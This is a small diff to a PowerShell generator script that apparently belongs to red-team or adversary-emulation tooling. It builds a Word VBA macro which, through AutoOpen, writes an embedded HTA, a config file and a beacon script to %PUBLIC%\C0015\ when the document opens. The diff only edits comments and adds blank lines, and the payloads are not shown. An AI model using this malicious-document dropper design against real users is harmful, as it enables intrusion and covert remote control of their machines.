@@ -2,9 +2,9 @@
 .SYNOPSIS
 Generate the self-contained VBA module (stage/ws01/macro_embedded.vba) that embeds
 config.ini + bootstrap.hta + c0015_beacon.ps1 as base64 chunks, so the Word macro
-WRITES them to %PUBLIC%\C0015\ at open time (phases/phase1-initial-access/rerun-v2-remote-operator-design.md §3.1).
+WRITES them to %PUBLIC%\C0015\ at open time (phases/phase1-initial-access/initial-access-chain-design.md §3.1).
 
-REWRITTEN 2026-10-02 (goal #3): the module is built from scratch as ONE clean
+The module is built as ONE clean
 standard-module body - no template splicing - so no trailing-junk / End-Sub
 boundary hazards. Trigger = `Public Sub AutoOpen()` ONLY (standard module;
 Document_Open is skipped because the ThisDocument object module collides with
@@ -182,5 +182,7 @@ Set-Content -LiteralPath $out -Value ($L -join "`r`n") -Encoding UTF8
 Write-Output "generated: $out ($($L.Count) lines)"
 $runCount = ([regex]::Matches(($L -join "`r`n"), '(?m)^\s*Public Sub AutoOpen\b')).Count
 Write-Output "guard: AutoOpen x$runCount (can be 1); WS01: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba"
+
+
 
 
